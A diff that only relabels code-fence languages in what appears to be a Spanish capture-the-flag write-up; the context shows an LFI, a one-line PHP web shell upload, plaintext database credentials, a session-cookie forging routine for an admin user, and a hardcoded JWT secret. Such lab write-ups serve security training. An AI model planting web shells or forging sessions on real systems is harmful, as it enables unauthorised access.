@@ -247,7 +247,7 @@ Esta función la llama de un archivo en javascript
 
 Y encuentro la función
 
-```javascript
+```nullscript
 function getInfo(e){
     const bookId = "book" + $(e).closest('tr').attr('id') + ".html";
     jQuery.ajax({
@@ -364,7 +364,7 @@ Para automitar el que no aplique el redirect, desde las opciones de BurpSuite, e
 
 Pruebo a subir un archivo en PHP que me permita ejecutar comandos
 
-```php
+```null
 <?php
   system($_REQUEST['cmd']);
 ?>
@@ -394,13 +394,13 @@ Lo copio a un archivo y transformo los \r y \n en retornos de carro y saltos de 
 
 El archivo está importando el fichero db.php
 
-```php
+```null
 require '../db/db.php';
 ```
 
 Hay credenciales en texto claro
 
-```php
+```null
 $user="bread";
 $password="jUli901";
 ```
@@ -480,7 +480,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 Desde el LFI, me traigo el contenido del archivo y lo copio a mi equipo local. Tiene una función que crea la cookie de sesión. Está tomando una cadena qu aparece hardcodeada, el nombre del usuario y un valor aleatorio entre 0 y la longitud del nombre del usuario menos una unidad
 
-```php
+```null
 function makesession($username){
     $max = strlen($username) - 1;
     $seed = rand(0, $max);
@@ -493,7 +493,7 @@ function makesession($username){
 
 Para poder ver el resutlado, le añado al script una sentencia que se encargue de imprimir la cookie para un usuario dado. Como el usuario Paul estaba activo y era administrador, trataré de computar su cookie de sesión.
 
-```php
+```null
 print(makesession("paul"))
 ```
 
@@ -541,7 +541,7 @@ Si trato de subir de nuevo un archivo, me sigue poniendo que no tengo privilegio
 
 Se ve hardcodeado el secreto para crear un JWT
 
-```php
+```null
 $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
 ```
 
